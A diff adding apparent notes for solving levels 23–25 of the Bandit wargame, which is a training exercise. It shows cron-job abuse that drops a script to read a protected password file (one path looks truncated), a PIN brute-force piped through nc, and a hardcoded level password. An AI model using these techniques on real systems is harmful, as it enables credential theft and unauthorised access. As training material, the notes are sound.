@@ -123,3 +123,44 @@ lvl 22 {
     cat /usr/bin/cronjob_bandit22.sh
     cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 }
+
+lvl 23 {
+    ls /etc/cron.d/
+    cat /etc/cron.d/cronjob_bandit23
+    cat /usr/bin/cronjob_bandit23.sh
+    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+    cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+}
+
+lvl 24 {
+    ls /etc/cron.d
+    cat /etc/cron.d/cronjob_bandit24
+    cat /usr/bin/cronjob_bandit24.sh
+
+    mktemp -d /tmp/XXXXXXXX
+    chmod 777 /tmp/8AWnBX3B
+    nano get_pass.sh {
+        #!/bin/bash
+		cat /etc/bandit_pass/bandit > /tmp/8AWnBX3B/password.txt
+    }
+
+    chmod 777 /tmp/8AWnBX3B/get_pass.sh
+    cp /tmp/8AWnBX3B/get_pass.sh /var/spool/bandit24/foo/
+    cat password.txt
+}
+
+lvl 25 {
+    mktemp -d /tmp/XXXXXX
+    nano get_pass.sh {
+        #!/bin/bash
+		pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+		for i in {0000..9999}
+		do
+        	echo "$pwd $i"
+		done
+    }
+
+    chmod +x get_pass.sh
+	./get_pass.sh | nc localhost 30002 | grep -v "Wrong"
+}
